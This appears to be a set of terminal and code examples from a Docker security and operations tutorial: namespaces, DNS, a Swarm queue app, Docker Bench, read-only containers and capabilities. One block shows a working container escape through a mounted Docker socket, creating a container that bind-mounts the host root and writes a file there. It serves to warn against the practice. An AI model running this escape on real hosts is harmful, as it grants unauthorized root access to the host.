["```\n$ # Start an NGINX container\n$ docker run -d --rm nginx\n650a1baedb0c274cf91c086a9e697b630b2b60d3c3f94231c43984bed1073349\n\n$ # What can we see from a new/separate container?\n$ docker run --rm \\\n ubuntu \\\n ps -ef \nUID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 16:37 ?        00:00:00 ps -ef\n\n$ # Now let us try the same thing but attach to the NGINX's PID space\n$ docker run --rm \\\n --pid \"container:650a1bae\" \\\n ubuntu \\\n ps -ef \nUID      PID  PPID  C STIME TTY    TIME CMD\nroot       1     0  0 16:37 ?      00:00:00 nginx: master process nginx -g daemon off;\nsystemd+   7     1  0 16:37 ?      00:00:00 nginx: worker process\nroot       8     0  0 16:37 ?      00:00:00 ps -ef\n```", "```\n$ # Sanity check\n$ docker run --rm \\\n ubuntu \\\n ps -ef \nUID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 16:44 ?        00:00:00 ps -ef\n\n$ # Now we try to attach to host's process namespace\n$ docker run --rm \\\n --pid host \\\n ubuntu \\\n ps -ef \nUID        PID  PPID  C STIME TTY          TIME CMD\nroot         1     0  0 15:44 ?        00:00:02 /sbin/init splash\nroot         2     0  0 15:44 ?        00:00:00 [kthreadd]\nroot         4     2  0 15:44 ?        00:00:00 [kworker/0:0H]\n<snip>\nroot      5504  5485  3 16:44 ?        00:00:00 ps -ef\n```", "```\n$ docker system events\n```", "```\n$ docker run -it \\\n --rm \\\n ubuntu /bin/bash \n$ root@563ad88c26c3:/# exit\nexit\n```", "```\n$ docker system events\n2017-09-27T10:54:58.943347229-07:00 container create 563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f (image=ubuntu, name=thirsty_mccarthy)\n2017-09-27T10:54:58.943965010-07:00 container attach 563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f (image=ubuntu, name=thirsty_mccarthy)\n2017-09-27T10:54:58.998179393-07:00 network connect 1e1fd43bd0845a13695ea02d77af2493a449dd9ee50f2f1372f589dc4968410e (container=563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f, name=bridge, type=bridge)\n2017-09-27T10:54:59.236311822-07:00 container start 563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f (image=ubuntu, name=thirsty_mccarthy)\n2017-09-27T10:54:59.237416694-07:00 container resize 563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f (height=57, image=ubuntu, name=thirsty_mccarthy, width=176)\n2017-09-27T10:55:05.992143308-07:00 container die 563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f (exitCode=0, image=ubuntu, name=thirsty_mccarthy)\n2017-09-27T10:55:06.172682910-07:00 network disconnect 1e1fd43bd0845a13695ea02d77af2493a449dd9ee50f2f1372f589dc4968410e (container=563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f, name=bridge, type=bridge)\n2017-09-27T10:55:06.295496139-07:00 container destroy 563ad88c26c3ae7c9f34dfe05c77376397b0f79ece3e233c0ce5e7ae1f01004f (image=ubuntu, name=thirsty_mccarthy)\n```", "```\n$ # Show what the default /etc/hosts has\n$ docker run --rm \\\n -it \\\n ubuntu \\\n /bin/cat /etc/hosts \n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n172.17.0.2    3c46adb8a875\n\n$ # We now will add our fake server1 host mapping\n$ docker run --rm \\\n -it \\\n --add-host \"server1:123.45.67.89\" \\\n ubuntu \\\n /bin/cat /etc/hosts \n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n123.45.67.89    server1\n172.17.0.2    dd4d7c6ef7b8\n\n$ # What does the container see when we have an additional host?\n$ docker run --rm \\\n -it \\\n --add-host \"server1:123.45.67.89\" \\\n ubuntu /bin/bash \nroot@0ade7f3e8a80:/# getent hosts server1\n123.45.67.89    server1\n\nroot@0ade7f3e8a80:/# exit\nexit\n```", "```\n{\n...\n        \"dns\": [\"1.2.3.4\", \"5.6.7.8\", ...],\n        \"dns-search\": [\"domain.com\", ...],\n...\n}\n```", "```\n$ # Since my default DNS is pointed to localhost, the default should be Google's DNS servers\n$ docker run --rm \\\n -it \\\n ubuntu \\\n /bin/cat /etc/resolv.conf \n# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)\n#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN\n# 127.0.0.53 is the systemd-resolved stub resolver.\n# run \"systemd-resolve --status\" to see details about the actual nameservers.\nnameserver 8.8.8.8\nnameserver 8.8.4.4\n\n$ # Now we will specify a custom DNS and DNS search prefix and see what the same file looks like\n$ docker run --rm \\\n -it \\\n --dns 4.4.4.2 \\\n --dns-search \"domain.com\" \\\n ubuntu \\\n /bin/cat /etc/resolv.conf \nsearch domain.com\nnameserver 4.4.4.2\n```", "```\n2377 TCP - Used for Swarm node communication\n4789 UDP - Container ingress network\n7946 TCP/UDP - Container network discovery\n50 IP - Used for secure communication of overlay networks if you use \"--opt encrypted\" when creating the overlay network\n```", "```\n{\n  \"name\": \"queue-worker\",\n  \"version\": \"0.0.1\",\n  \"scripts\": {\n    \"start\": \"node index.js\"\n  },\n  \"dependencies\": {\n    \"bull\": \"^3.2.0\"\n  }\n}\n```", "```\n'use strict'\n\nconst Queue = require('bull');\n\nconst veryImportantThingsQueue = new Queue('very_important_things',\n                                           { redis: { port: 6379,\n                                                      host: process.env.QUEUE_HOST }});\n\n// Prints any message data received\nclass Receiver {\n    constructor () {\n        console.info('Registering listener...');\n        veryImportantThingsQueue.process(job => {\n            console.info('Got a message from the queue with data:', job.data);\n            return Promise.resolve({});\n        });\n    }\n}\n\n// Sends the date every 1.5 seconds\nclass Sender {\n    constructor () {\n        function sendMessage() {\n            const messageValue = new Date();\n            console.info('Sending a message...', messageValue);\n            veryImportantThingsQueue.add({ 'key': messageValue });\n        }\n\n        setInterval(sendMessage, 1500);\n    }\n}\n\n// Sanity check\nif (process.argv.length < 2) {\n    throw new Error(`Usage: ${process.argv.slice(2).join(' ')} <sender | receiver>`);\n}\n\n// Start either receiver or sender depending of CLI arg\nconsole.info('Starting...');\nif (process.argv[2] === 'sender') {\n    new Sender();\n} else if (process.argv[2] === 'receiver') {\n    new Receiver();\n} else {\n    throw new Error(`Usage: ${process.argv.slice(0, 2).join(' ')} <sender | receiver>`);\n}\n```", "```\nFROM node:8\n\n# Make sure we are fully up to date\nRUN apt-get update -q && \\\n apt-get dist-upgrade -y && \\\n apt-get clean && \\\n apt-get autoclean\n\n# Container port that should get exposed\nEXPOSE 8000\n\nENV SRV_PATH /usr/local/share/queue_handler\n\n# Make our directory\nRUN mkdir -p $SRV_PATH && \\\n chown node:node $SRV_PATH\n\nWORKDIR $SRV_PATH\n\nUSER node\n\nCOPY . $SRV_PATH/\n\nRUN npm install\n\nCMD [\"npm\", \"start\"]\n```", "```\n$ docker build -t queue-worker .\nSending build context to Docker daemon  7.168kB\n<snip>\n ---> 08e33a32ba60\nRemoving intermediate container e17c836c5a33\nSuccessfully built 08e33a32ba60\nSuccessfully tagged queue-worker:latest\n```", "```\nversion: \"3\"\nservices:\n queue-sender:\n image: queue-worker\n command: [\"npm\", \"start\", \"sender\"]\n networks:\n - queue_network\n deploy:\n replicas: 1\n depends_on:\n - redis-server\n environment:\n - QUEUE_HOST=redis-server\n\n queue-receiver:\n image: queue-worker\n command: [\"npm\", \"start\", \"receiver\"]\n networks:\n - queue_network\n deploy:\n replicas: 1\n depends_on:\n - redis-server\n environment:\n - QUEUE_HOST=redis-server\n\n redis-server:\n image: redis\n networks:\n - queue_network\n deploy:\n replicas: 1\n networks:\n - queue_network\n ports:\n - 6379:6379\n\nnetworks:\n queue_network:\n```", "```\n$ # We need a Swarm first\n$ docker swarm init\nSwarm initialized: current node (c0tq34hm6u3ypam9cjr1vkefe) is now a manager.\n<snip>\n\n$ # Now we deploy our stack and name it \"queue_stack\"\n$ docker stack deploy \\\n               -c swarm_application.yml \\\n               queue_stack\nCreating service queue_stack_queue-sender\nCreating service queue_stack_queue-receiver\nCreating service queue_stack_redis-server\n\n$ # At this point, we should be seeing some traffic...\n$ docker service logs queue_stack_queue-receiver\n<snip>\nqueue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Starting...\nqueue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Registering listener...\nqueue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Got a message from the queue with data: { key: '2017-10-02T08:24:21.391Z' }\nqueue_stack_queue-receiver.1.ozk2uxqnbfqz@machine    | Got a message from the queue with data: { key: '2017-10-02T08:24:22.898Z' }\n<snip>\n\n$ # Yay! It's working!\n\n$ # Let's clean things up to finish up\n$ docker stack rm queue_stack\nRemoving service queue_stack_queue-receiver\nRemoving service queue_stack_queue-sender\nRemoving service queue_stack_redis-server\nRemoving network queue_stack_redis-server\nRemoving network queue_stack_queue_network\nRemoving network queue_stack_service_network\n\n$ docker swarm leave --force\nNode left the swarm.\n```", "```\n$ Start a \"benign\" container with the Docker socket mounted and run Bash\n$ docker run --rm \\\n -it \\\n -v /var/run/docker.sock:/var/run/docker.sock \\\n ubuntu /bin/bash \n\nroot@686212135a17:/# # Sanity check - make sure that the socket is there\nroot@686212135a17:/# ls -la /var/run/docker.sock\nsrw-rw---- 1 root 136 0 Sep 20 05:03 /var/run/docker.sock\n\nroot@686212135a17:/# # Install curl but almost any other HTTP client will work\nroot@686212135a17:/# # Even a base Python can do this but curl is fine for brevity\nroot@686212135a17:/# apt-get update && apt-get install -y curl\n<snip>\ndone\n\nroot@686212135a17:/# # Create a container through the socket and bind-mount root to it\nroot@686212135a17:/# # with a \"malicious\" touch command to run\nroot@686212135a17:/# curl -s \\\n --unix-socket /var/run/docker.sock \\\n -H \"Content-Type: application/json\" \\\n -d '{\"Image\": \"ubuntu\", \"Cmd\": [\"touch\", \"/mnt/security_breach\"], \"Mounts\": [{\"Type\": \"bind\", \"Source\": \"/\", \"Target\":\"/mnt\", \"RW\": true}]}' \\\n -X POST \\\n http:/v1.29/containers/create \n{\"Id\":\"894c4838931767462173678aacc51c3bb98f4dffe15eaf167782513305c72558\",\"Warnings\":null}\n\nroot@686212135a17:/# # Start our escaped container\nroot@686212135a17:/# curl --unix-socket /var/run/docker.sock \\\n -X POST \\\n http:/v1.29/containers/894c4838/start\n\nroot@686212135a17:/# # Exit out of our \"benign\" container back to host\nroot@686212135a17:/# exit\nexit\n\n$ # Let's see what happened on our host\n$ ls -la / | grep breach\n-rw-r--r--   1 root root       0 Sep 20 23:14 security_breach \n$ # Oops!\n```", "```\n$ docker run --rm \\\n -it \\\n --net host \\\n --pid host \\\n --cap-add audit_control \\\n -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \\\n -v /var/lib:/var/lib \\\n -v /var/run/docker.sock:/var/run/docker.sock \\\n -v /usr/lib/systemd:/usr/lib/systemd \\\n -v /etc:/etc \\\n docker/docker-bench-security\n# ------------------------------------------------------------------------------\n# Docker Bench for Security v1.3.3\n#\n# Docker, Inc. (c) 2015-\n#\n# Checks for dozens of common best-practices around deploying Docker containers in production.\n# Inspired by the CIS Docker Community Edition Benchmark v1.1.0.\n# ------------------------------------------------------------------------------\n\nInitializing Mon Oct  2 00:03:29 CDT 2017\n\n[INFO] 1 - Host Configuration\n[WARN] 1.1  - Ensure a separate partition for containers has been created\n[NOTE] 1.2  - Ensure the container host has been Hardened\ndate: invalid date '17-10-1 -1 month'\nsh: out of range\nsh: out of range\n[PASS] 1.3  - Ensure Docker is up to date\n[INFO]      * Using 17.09.0 which is current\n[INFO]      * Check with your operating system vendor for support and security maintenance for Docker\n[INFO] 1.4  - Ensure only trusted users are allowed to control Docker daemon\n[INFO]      * docker:x:999\n[WARN] 1.5  - Ensure auditing is configured for the Docker daemon\n[WARN] 1.6  - Ensure auditing is configured for Docker files and directories - /var/lib/docker\n[WARN] 1.7  - Ensure auditing is configured for Docker files and directories - /etc/docker\n[INFO] 1.8  - Ensure auditing is configured for Docker files and directories - docker.service\n<snip>\n[PASS] 2.10 - Ensure base device size is not changed until needed\n[WARN] 2.11 - Ensure that authorization for Docker client commands is enabled\n[WARN] 2.12 - Ensure centralized and remote logging is configured\n[WARN] 2.13 - Ensure operations on legacy registry (v1) are Disabled\n[WARN] 2.14 - Ensure live restore is Enabled\n[WARN] 2.15 - Ensure Userland Proxy is Disabled\n<snip>\n[PASS] 7.9  - Ensure CA certificates are rotated as appropriate (Swarm mode not enabled)\n[PASS] 7.10 - Ensure management plane traffic has been separated from data plane traffic (Swarm mode not enabled)\n```", "```\n$ # Start a regular container\n$ docker run -it \\\n --rm \\\n ubuntu /bin/bash \nroot@79042a966943:/# # Write something to /bin\nroot@79042a966943:/# echo \"just_a_test\" > /bin/test\n\nroot@79042a966943:/# # Check if it's there\nroot@79042a966943:/# ls -la /bin | grep test\n-rw-r--r-- 1 root root      12 Sep 27 17:43 test\n\nroot@79042a966943:/# exit\nexit\n\n$ # Now try a read-only container\n$ docker run -it \\\n --rm \\\n --tmpfs /run \\\n --tmpfs /tmp \\\n --tmpfs /var/tmp \\\n --read-only \\\n ubuntu /bin/bash \nroot@5b4574a46c09:/# # Try to write to /bin\nroot@5b4574a46c09:/# echo \"just_a_test\" > /bin/test\nbash: /bin/test: Read-only file system\n\nroot@5b4574a46c09:/# # Works as expected! What about /tmp?\nroot@5b4574a46c09:/# echo \"just_a_test\" > /tmp/test\nroot@5b4574a46c09:/# ls /tmp\ntest\n\nroot@5b4574a46c09:/# exit\nexit\n```", "```\n...\nRUN apt-get update && apt-get -y dist-upgrade\n...\n```", "```\n$ # Run an NTP daemon without the extra privileges and see what happens\n$ docker run -it \\\n --rm \\\n cguenther/ntpd \nntpd: can't set priority: Permission denied\nreset adjtime failed: Operation not permitted\ncreating new /var/db/ntpd.drift\nadjtimex failed: Operation not permitted\nadjtimex adjusted frequency by 0.000000ppm\nntp engine ready\nreply from 38.229.71.1: offset -2.312472 delay 0.023870, next query 8s\nsettimeofday: Operation not permitted\nreply from 198.206.133.14: offset -2.312562 delay 0.032579, next query 8s\nreply from 96.244.96.19: offset -2.302669 delay 0.035253, next query 9s\nreply from 66.228.42.59: offset -2.302408 delay 0.035170, next query 7s\n^C\n\n$ And now with our new privileged mode\n$ docker run -it \\\n --rm \\\n --privileged \\\n cguenther/ntpd \ncreating new /var/db/ntpd.drift\nadjtimex adjusted frequency by 0.000000ppm\nntp engine ready\n^C\n```", "```\n$ # Sanity check\n$ docker run -it \\\n --rm \\\n cguenther/ntpd \nntpd: can't set priority: Permission denied\n<snip>\nsettimeofday: Operation not permitted\n<snip>\n^C\n\n$ # Now with the added SYS_TIME capability\n$ docker run -it \\\n --rm \\\n --cap-add SYS_TIME \\\n cguenther/ntpd \nntpd: can't set priority: Permission denied\ncreating new /var/db/ntpd.drift\nadjtimex adjusted frequency by 0.000000ppm\nntp engine ready\nreply from 204.9.54.119: offset 15.805277 delay 0.023080, next query 5s\nset local clock to Mon Oct  2 06:05:47 UTC 2017 (offset 15.805277s)\nreply from 38.229.71.1: offset 0.005709 delay 31.617842, next query 9s\n^C\n```", "```\ndocker run -it \\\n --rm \\\n --cap-drop ALL \\\n --cap-add SYS_TIME \\\n --cap-add SYS_CHROOT \\\n --cap-add SETUID \\\n --cap-add SETGID \\\n --cap-add SYS_NICE \\\n cguenther/ntpd \ncreating new /var/db/ntpd.drift\nadjtimex adjusted frequency by 0.000000ppm\nntp engine ready\nreply from 216.229.0.49: offset 14.738336 delay 1.993620, next query 8s\nset local clock to Mon Oct  2 06:16:09 UTC 2017 (offset 14.738336s)\nreply from 216.6.2.70: offset 0.523095 delay 30.422572, next query 6s\n^C\n```"]